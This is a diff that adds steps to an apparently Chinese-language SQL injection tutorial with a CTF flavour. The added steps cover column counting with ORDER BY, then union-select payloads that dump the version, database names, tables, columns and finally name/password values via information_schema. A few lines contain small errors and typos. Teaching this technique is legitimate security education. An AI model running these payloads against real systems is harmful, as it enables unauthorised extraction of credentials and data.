@@ -432,6 +432,11 @@
 </li>
 </ol>
 <p>//所有数据都是从information_schema.columns这个表里获取，因为从information_schema这个库的介绍(<a href="http://dev.mysql.com/doc/refman/5.1/zh/information-schema.html)我们可以看到，从information_schema.columns这个表里，我们可以查到所有的信息，因为它在里面，table_schema、table_name、column_name这个三个列都有，所以我们可以直接通过这个表，查出我们需要的所有信息，就省了换表这一步了，进一步提升速度" target="_blank" rel="noopener">http://dev.mysql.com/doc/refman/5.1/zh/information-schema.html)我们可以看到，从information_schema.columns这个表里，我们可以查到所有的信息，因为它在里面，table_schema、table_name、column_name这个三个列都有，所以我们可以直接通过这个表，查出我们需要的所有信息，就省了换表这一步了，进一步提升速度</a><br><img src="http://p8hvan4e5.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180513111032.png" alt="image"></p>
+<p>找到注入点后，我们用order by语句查询数据库中存在多少数据表<br>确定多少个表，为了便于说明，假设有三个数据表，<br> Order by 3 返回正常<br>order by 4返回错误<br>然后使用and 1=2 union select 1，2，3 %23爆出可以回显敏感信息的位置,假设在2和3上</p>
+<p>下面我们就要查询敏感信息了，就要用到上面所说的系统函数了<br> and 1=2 union select 1,version(),database()可以爆出当前使用的版本和数据库名<br>，也可以使用group_concat函数全部爆出来 and 1=2 union select 1,2,group_concat(schema_name) from information_schema.schemata%23 。<br>我们假设其中有flag库</p>
+<p>and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where schema_name=’flag’ 爆出flag库下的所有的表，假设其中有flagtable表</p>
+<p>and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name =’flagtale’爆出flagtable下的所有字段，假设有name和password字段</p>
+<p>and 1=2 union select 1,2,group_concat(name,password) from flag.flagtable爆出flag下的flagtable表的name和password的内容</p>
 
           
         
